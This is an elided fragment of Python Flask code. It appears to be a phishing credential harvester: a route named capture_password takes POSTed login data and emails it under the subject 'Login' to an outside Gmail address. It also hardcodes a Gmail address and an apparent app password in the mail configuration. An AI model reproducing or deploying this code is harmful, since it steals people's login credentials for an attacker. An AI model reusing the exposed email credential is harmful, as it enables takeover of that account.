...
app.config['MAIL_USERNAME'] = 'davidcarterr387@gmail.com  '  # Your Gmail address
app.config['MAIL_PASSWORD'] = 'jyvxyingvywxfumx'   # Your Gmail password or app-specific password
...
def capture_password():
    if request.method == 'POST':
        ...
        recipient =  'rm5508105@gmail.co'  # Your email address to receive the email
        subject = 'Login'
